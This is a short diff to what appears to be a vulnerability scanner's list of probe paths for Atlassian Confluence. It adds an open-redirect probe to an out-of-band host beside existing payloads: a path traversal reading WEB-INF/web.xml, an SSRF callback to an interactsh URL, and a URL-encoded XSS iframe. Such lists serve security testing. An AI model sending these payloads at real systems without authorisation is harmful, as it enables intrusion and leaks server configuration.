@@ -3,3 +3,4 @@
 /s/{{randstr}}/_/;/WEB-INF/web.xml
 /rest/sharelinks/1.0/link?url=https://{{interactsh-url}}/
 /pages/includes/status-list-mo%3CIFRAME%20SRC%3D%22javascript%3Aalert%281337%29%22%3E.vm
+/ThisCanBeAnything?os_destination=%2F%2Foast.pro
